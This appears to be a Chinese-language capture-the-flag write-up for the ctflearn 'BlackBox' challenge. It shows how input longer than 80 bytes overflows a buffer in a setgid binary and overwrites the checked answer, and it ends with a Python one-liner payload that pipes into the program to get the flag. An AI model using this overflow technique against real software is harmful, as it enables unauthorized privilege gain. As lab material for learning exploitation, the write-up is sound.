---
layout: post
title: BlackBox
categories: writeups
tags: misc
ctfsite: ctflearn.com
challenge_url: https://ctflearn.com/problems/393
challenge_url_comment: 需要注册登录
---

登录到服务器后，看一下目录，发现既没有源代码，二进制程序也没有读取的权限，只有执行权限：

{% highlight text %}
total 36
drwxr-xr-x  2 root root         4096 Oct  9  2017 .
drwxr-xr-x 12 root root         4096 Oct 24 11:46 ..
-r--r--r--  1 root root          220 Aug 31  2015 .bash_logout
-r--r--r--  1 root root         3771 Aug 31  2015 .bashrc
---x--s--x  1 root blackbox_pwn 8936 Jan 31 17:16 blackbox
-r--r--r--  1 root root            0 Sep 18  2017 .cloud-locale-test.skip
-r--r-----  1 root blackbox_pwn   33 Oct  9  2017 flag.txt
-r--r--r--  1 root root          655 May 16  2017 .profile
{% endhighlight %}

{% include writeup_begin.html %}

运行一下 `blackbox`，程序要求输入 1 + 1 等于几。尝试输入 2：

{% highlight text %}
blackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox
What is 1 + 1 = 2
No dummy... 1 + 1 != 0...
{% endhighlight %}

随后发现不论输入什么数，程序都只输出 `No dummy... 1 + 1 != 0...`。鉴于没什么可以做的，只能尝试把输入的字符串变长。直到字符串长度超过 80 个字节后，程序的输出发生了变化：

{% highlight text %}
blackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox
What is 1 + 1 = 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111
No dummy... 1 + 1 != 825307441...
{% endhighlight %}

计算器转换一下 `825307441`，发现正好为 `0x31313131`，即我们的字符串溢出覆盖了待检查的结果。慢慢尝试缩短字符串，发现从 第 81 个字节开始就会覆盖答案。因此执行：

`python -c "print '11111111111111111111111111111111111111111111111111111111111111111111111111111111\x02\x00\x00\x00'" | ./blackbox`

就可以得到 flag 了。

{% include writeup_end.html %}
